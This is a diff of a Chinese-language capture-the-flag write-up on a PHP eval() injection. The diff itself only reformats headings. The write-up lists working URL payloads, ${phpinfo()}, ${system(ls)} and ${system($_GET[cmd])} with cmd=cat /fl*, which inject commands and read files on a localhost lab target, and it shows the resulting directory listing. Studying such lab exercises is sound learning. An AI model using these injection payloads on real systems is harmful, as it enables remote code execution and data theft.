@@ -224,17 +224,17 @@ class TimeModel
 > eval() 會生成並執行 date()
 
 ### 3. Web Shell
-3.1 沒有處理輸入，嘗試 ＄{} 執行 PHP\
+#### 3.1 沒有處理輸入，嘗試 ＄{} 執行 PHP
 http://localhost:8082/?format=${phpinfo()}
 ![image](https://hackmd.io/_uploads/H19qUQOAR.png)
 > 成功 ？！！
 
-3.2 執行 system() Execute Code
+#### 3.2 執行 system() Execute Code
 http://localhost:8082/?format=${system(ls)}
 ![image](https://hackmd.io/_uploads/BJOUw7_CC.png)
 > Router.php assets controllers index.php models static views
 
-3.3 Find Flag
+#### 3.3 Find Flag
 http://localhost:8082/?format=${system($_GET[cmd])}&cmd=cat%20/fl*
 ![image](https://hackmd.io/_uploads/H1kucXdA0.png)
 
